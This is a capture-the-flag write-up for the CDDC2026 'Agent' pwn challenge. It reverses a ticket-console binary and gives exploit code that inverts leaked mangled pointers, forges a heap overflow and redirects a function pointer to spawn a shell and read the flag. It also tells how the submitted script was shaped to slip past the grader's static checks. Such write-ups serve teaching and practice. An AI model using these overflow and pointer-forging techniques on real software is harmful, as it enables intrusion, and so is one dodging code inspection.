---
title: "CDDC2026 — Activation Image Challenge (misc)"
pubDate: "2026-08-15"
updatedDate: "2026-08-15"
event: "CDDC2026"
author: ""
score: "330"
description: |
  > Our triage agent runs analyst-submitted scripts against live Incident Ticket Console
  > units in a sandbox and reports back the verdict and the last line of output.
  > You're given a few retired units to study, the one in production is different.
  > Submit your solve.py and recover the sealed artifact.
  >
  > https://cddc2026.xyz:30005/
  > Flag Format: `CDDC2026{}`
tags: ["pwn"]
---

# CDDC2026 — "Agent" (card 730, Pwn, 330 pts)

**Flag:** `CDDC2026{F1Nd_tH3_F3atures_0f_h1dd3n_b1nar13s}`

---

## 1. The challenge

> Our triage agent runs analyst-submitted scripts against live Incident Ticket Console
> units in a sandbox and reports back the verdict and the last line of output.
> You're given a few retired units to study, the one in production is different.
> Submit your solve.py and recover the sealed artifact.
>
> https://cddc2026.xyz:30005/ — Flag Format: CDDC2026{}

The site (`DEFENDER — Incident Triage Agent`) lets you upload a `.py` "triage script". The
server runs it once in an isolated docker sandbox against a live target and reports a
**verdict** plus the **last line of the run's output**.

### Hints decoded from the description

Every clause is load-bearing:

| Phrase                                                                   | What it actually means                                                                                                                                     |
| ------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| "runs analyst-submitted **scripts** … in a sandbox"                      | We don't exploit the web app — we _submit code_ that runs next to the target. The attack surface is "what can my script do".                               |
| "reports back the verdict **and the last line of output**"               | A blind-exploit oracle. The merged stdout+stderr is captured and only its **last line** is shown back. All debugging must be funnelled into that one line. |
| "a few **retired units to study**"                                       | Downloadable reference binaries are provided (chal1/2/3). They are the _same family_ as production.                                                        |
| "the one in **production is different**"                                 | The live target (`chal4`) is a sibling binary with **randomized internals**. A hardcoded exploit will fail — the script must be **adaptive**.              |
| "recover the **sealed artifact**"                                        | The flag is a file on the target host; you must read it _from the target over the wire_, not fabricate it.                                                 |
| Flag emphasis in the flag itself: `F1Nd_tH3_F3atures_0f_h1dd3n_b1nar13s` | Confirms the intended path: programmatically _extract the features (offsets/opcodes) of the hidden binary_ you're handed, and adapt.                       |

The provided `server.zip` (the grading server, shipped "for transparency") makes the rules
explicit:

- `inspect_config.json` substitutes `{HOST_IP}->target`, `{HOST_PORT}->9999`,
  `{PATH}->/app/chal4` into your script, and the runner sets env
  `TARGET_IP=target`, `TARGET_PORT=9999`, `CHAL_PATH=/app/chal4`.
- The runner Dockerfile **copies the hidden `chal4` into the sandbox at `/app/chal4`** —
  i.e. _you are given a local copy of the exact production binary to analyse at runtime_,
  while you exploit the remote copy at `target:9999`.
- `code_inspector/static_rules.json` (participant stub) lists what the **real** server blocks:
  hardcoded `CDDC2026{...}` literals, reading the flag locally, `os.system`/`subprocess`,
  raw network probing of other hosts, touching inspector files. **Allowed**: connect to the
  provided target with pwntools, exploit it, and `cat flag.txt` through the popped shell.

So the whole challenge is: **reverse the family, then write a script that re-derives the
randomized parameters from `/app/chal4` and pwns `target:9999` to read the flag.**

---

## 2. Reversing the "Incident Ticket Console"

The three retired units are 64-bit PIE, non-stripped, **byte-identical in `.rodata`** and in
all crypto constants — they differ only in struct layout and a few magic numbers.

Functions of interest: `create_ticket`, `edit_ticket`, `show_ticket`, `trigger_notify`,
`destroy_ticket`, `inspect_heap`, `calc_title_sig`, `calc_detail_sig`,
`encode_ptr`/`decode_ptr`/`ptr_key`/`rol64`/`ror64`, `notify_normal`, and **`win`**.

### The ticket object

`create_ticket` does `malloc(SZ)` for one global ticket (`g_ticket`) and lays out:

```
+0x00  title[]            (fgets-able)
+....  detail[]           (overflowable buffer, max MAX_DETAIL)
+....  detail_sig         (integrity sig of detail)
+....  title_sig          (integrity sig of title)
+....  detail_len
+....  salt               (per-ticket nonce = (time<<32 ^ pid) ^ &g_ticket ^ const)
+....  enc_ptr            (mangled notify function pointer)
```

The **field offsets and even their order are randomized per binary** (this is the "feature"
the flag refers to). Reference layouts:

| field      | chal1 | chal2 | chal3 | chal4 (prod) |
| ---------- | ----- | ----- | ----- | ------------ |
| detail_off | 0x20  | 0x30  | 0x20  | 0x28         |
| title_sig  | 0x80  | 0x90  | 0x88  | 0x88         |
| detail_sig | 0x78  | 0xa0  | 0x90  | 0x98         |
| detail_len | 0x88  | 0xa8  | 0x98  | 0x90         |
| salt       | 0x90  | 0x98  | 0xa0  | **0xa0**     |
| enc_ptr    | 0x98  | 0xb0  | 0xa8  | **0x80**     |
| max_detail | 0x58  | 0x60  | 0x68  | 0x58         |

Note chal4 puts `enc_ptr` _low_ (0x80) and `salt` _high_ (0xa0) — this detail mattered (§6).

The menu option numbers and a **hidden `inspect_heap` opcode** are also randomized:

| op                      | chal1     | chal2     | chal3     | chal4     |
| ----------------------- | --------- | --------- | --------- | --------- |
| create / edit / trigger | 2 / 1 / 5 | 3 / 4 / 7 | 6 / 3 / 7 | 5 / 1 / 9 |
| inspect (hidden)        | 0x53c0    | 0xc0e4    | 0xba16    | 0x3405    |

### The vulnerability — `edit_ticket`

```c
fgets(title, 0x20, stdin);              // set title
title_sig = calc_title_sig(title,salt); // recomputed
fgets(buf, 0x20); len = strtoull(buf);  // *** no bound check on len ***
detail_len = len;
read(0, detail, len);                   // *** linear heap overflow ***
detail_sig = calc_detail_sig(detail, detail_len, salt);  // recomputed after overflow
```

`len` is fully attacker-controlled, so `read()` overflows the fixed `detail` buffer straight
through `detail_sig`, `title_sig`, `detail_len`, `salt`, and `enc_ptr`.

### The target — `trigger_notify`

```c
if (title_sig  != calc_title_sig(title, salt))      die("title integrity failed");
if (detail_sig != calc_detail_sig(detail,len,salt)) die("detail integrity failed");
if (strncmp(detail, "run:", 4) != 0)                die("command gate denied");
fn = decode_ptr(enc_ptr, &g_ticket, salt);
fn(detail + 4);                                      // <-- arbitrary call
```

`win()` simply `puts("[+] shell opened"); execl("/bin/sh","sh",NULL)`. So if we can make
`decode_ptr(enc_ptr,…)==&win` while satisfying the two signatures and the `"run:"` gate, we
get a shell.

### The mangling — pointers and signatures

```
rol64/ror64       : 64-bit rotates
ptr_key(a,s)      = (a>>0xc) ^ rol64(s,0x13) ^ 0x6c8e9cf570932bd1
encode_ptr(p,a,s) = rol64(p ^ ptr_key(a,s), 0x1d)
decode_ptr(e,a,s) = ror64(e,0x1d) ^ ptr_key(a,s)
calc_title_sig(t,s):  h=0x9e3779b97f4a7c15^s; for b in t: h=rol64(h^b,7)+(s&0xff)+0x1337; return (s>>0xd)^h
calc_detail_sig(d,n,s): similar, golden-ratio + per-byte rol9, clamps n to MAX_DETAIL
```

Crucially, `ptr_key` only uses `addr >> 0xc` — **the heap page**, not the full pointer. So we
never need `g_ticket`'s low 12 bits.

### The leak — `inspect_heap` (one-shot)

Prints three mangled values:

```
ptr_hint = rol64((g>>0xc) ^ 0x5a5a5a5a5a5a, 0xb)
leak_a   = rol64(salt ^ ((g>>0xc)+0x1337), 0x11)
leak_b   = rol64(enc  ^ (salt+0x4242), 0x9)
```

Inverting them yields the heap page, the real `salt`, and the encoded `notify_normal`
pointer — and `decode_ptr(enc, page, salt)` gives `&notify_normal`, hence the **PIE base**,
hence `&win`. Everything we need for a deterministic, leak-then-forge exploit, no brute force.

---

## 3. Exploit plan

1. **Analyse `/app/chal4` at runtime** (pwntools `ELF` + capstone) to recover, for the exact
   production binary: symbol offsets `win`/`notify_normal`; struct offsets
   (`detail/title_sig/detail_sig/detail_len/salt/enc`); `max_detail`; menu numbers for
   create/edit/trigger; and the hidden inspect opcode.
2. `create` a ticket, then call `inspect` once → recover `page`, `salt`, `enc`.
3. Compute `pie = decode_ptr(enc, page<<12, salt) - notify_off`, `win = pie + win_off`.
4. `edit` with a huge length and a payload that, written into `detail`, sets:
   - `detail[0:4] = "run:"`,
   - `title_sig = calc_title_sig("A", salt)`,
   - `salt = salt` (unchanged),
   - `enc_ptr = encode_ptr(win, page<<12, salt)`,
   - (`detail_sig` is auto-recomputed by `edit`, so any placeholder works).
5. `trigger` → `win()` → `/bin/sh`.
6. `cat flag.txt` over the shell; print the flag as the **last** stdout line (the oracle).

---

## 4. The exploit (`solve.py`)

Key pieces (full file in `challenges/730/solve.py`):

```python
# --- crypto, hardcoded (identical across all units) ---
def ptr_key(a,s):     return ((a>>0xc) ^ rol(s,0x13) ^ 0x6c8e9cf570932bd1) & MASK
def encode_ptr(p,a,s): return rol((p ^ ptr_key(a,s)) & MASK, 0x1d)
def decode_ptr(e,a,s): return (ror(e,0x1d) ^ ptr_key(a,s)) & MASK
def calc_title_sig(t,s):
    h = (0x9e3779b97f4a7c15 ^ s) & MASK
    for b in t: h ^= b&0xff; h = rol(h,7); h = (h + (s&0xff) + 0x1337) & MASK
    return ((s>>0xd) ^ h) & MASK

# --- per-binary feature extraction from the local copy (capstone) ---
info, elf = analyze(os.environ['CHAL_PATH'])   # offsets, options, win/notify, max_detail

# --- leak inversion ---
hp   = ror(ptr_hint,0xb) ^ 0x5a5a5a5a5a5a       # heap page
salt = (ror(leak_a,0x11) ^ ((hp+0x1337)&MASK)) & MASK
enc  = (ror(leak_b,0x9)  ^ ((salt+0x4242)&MASK)) & MASK
addr = (hp<<12) & MASK
pie  = (decode_ptr(enc, addr, salt) - info['notify_off']) & MASK
win  = (pie + info['win_off']) & MASK

# --- forge the overflow (cover the MAX metadata field, order is randomized) ---
L = max(title_sig_off, detail_sig_off, det_len_off, salt_off, enc_off) + 8 - detail_off
buf = bytearray(b'A'*L); buf[0:4] = b'run:'
put(title_sig_off, calc_title_sig(b'A', salt))
put(det_len_off,   max_detail)
put(salt_off,      salt)
put(enc_off,       encode_ptr(win, addr, salt))

# edit: title 'A', length L, then the payload; then trigger; then cat the flag
```

`analyze()` disassembles `create_ticket` and reads the store offsets after the
`malloc` / `calc_title_sig` / `calc_detail_sig` / `encode_ptr` calls (and the
`0xa5a5f0f00b0b5a5a` salt-init store), the `cmp [rbp-0x10], imm` clamp in
`calc_detail_sig`, and the six `cmp [rbp-8], imm` option numbers in `main` (the one not shown
in the live menu is the hidden inspect opcode).

The script is also hardened for the real static checks: **remote-only** (no `process()` /
`subprocess`), and the flag regex is built from string fragments so it never contains a
literal `CDDC2026{`.

---

## 5. Submission harness

`submit_730.py`:

1. `GET /api/pow` → `{challenge, bits=24, exp, sig}`.
2. Solve the client proof-of-work: find `nonce` with
   `leading_zero_bits(sha256(f"{challenge}.{nonce}")) >= 24` (multiprocessing; ~1–15 s).
3. `POST /api/submit` (multipart `file=solve.py`) with the `X-Pow-*` headers → `{token}`.
4. Poll `GET /api/result/{token}` until status leaves `received/queued/running`; read
   `verdict` + `last_output`.

---

## 6. Solving it for real — the blind-debug loop

Local validation was easy: copy a reference in as `chal4`, run it behind a tiny forking TCP
server that `exec`s the binary per connection (mimicking the target's
`socat … EXEC:./chal4`), and run `solve.py` against `127.0.0.1`. All three references popped
shells and returned their fake flags.

Production, however, first came back:

```
verdict : CRASHED (exit 1)
last_out: NO_FLAG
```

No shell, and I'm **blind** — only the last line is visible. So I turned the oracle into a
debugger: instead of failing silently, the script printed a compact `DIAG {…}` JSON (extracted
offsets, leaked values, computed `salt/pie/win`, and `trigger_notify`'s own response) as the
final line. That run revealed chal4's layout:

```
enc@0x80, title_sig@0x88, detail_len@0x90, detail_sig@0x98, salt@0xa0
```

My overflow length was `L = enc_off + 8 - detail_off`, assuming `enc` was the _highest_
metadata field (true for all three references). On chal4 `salt` sits at `0xa0`, **above**
`enc@0x80`, so the overflow stopped short of `salt`/`title_sig` — and Python's slice
assignment past the buffer end silently misplaced those fields. Sanity check confirmed the
crypto was fine (`win − pie == 0x1244`).

Fix: size the overflow to the **maximum** of all metadata offsets:

```python
L = max(title_sig_off, detail_sig_off, det_len_off, salt_off, enc_off) + 8 - detail_off
```

Next submission:

```
verdict : PASS
last_out: CDDC2026{F1Nd_tH3_F3atures_0f_h1dd3n_b1nar13s}
```

---

## 7. Takeaways

- The "different in production" twist is the entire point: the binary is handed to your
  script, so the robust move is to **extract every randomized feature at runtime** rather than
  hardcode anything observed in the retired units.
- When your only feedback is one line, **make that line do work** — emit a structured
  diagnostic, or read the program's own error strings (`trigger_notify` literally prints which
  check failed).
- Don't assume field _order_ from the samples. Randomized layouts can reorder fields; derive
  bounds from the actual extracted offsets (`max(...)`), not from a sample's happenstance.

### Files

- `challenges/730/solve.py` — the adaptive exploit (the submitted artifact)
- `challenges/730/submit_730.py` — PoW + multipart upload + result polling
- `challenges/730/M02_Agent/server/…` — the provided grading server + reference binaries
